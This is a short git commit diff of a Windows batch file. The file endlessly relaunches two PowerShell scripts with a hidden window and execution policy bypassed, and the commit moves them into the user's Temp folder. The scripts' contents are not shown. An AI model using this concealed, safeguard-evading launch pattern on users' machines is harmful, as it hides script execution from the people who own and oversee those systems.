b3f9860dffb6be1e5a9a3660e32746d580db96db
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-10-13 22:35:21 +0700

    Update new.bat

--- new.bat
+++ new.bat
@@ -1,7 +1,7 @@
 @echo off
 :loop
-start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "C:\Users\User\Desktop\MyScript.ps1"
+start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\MyScript.ps1"
 timeout /t 20 >nul
-start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "C:\Users\User\Desktop\stop.ps1"
+start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\stop.ps1"
 timeout /t 5 >nul
 goto loop
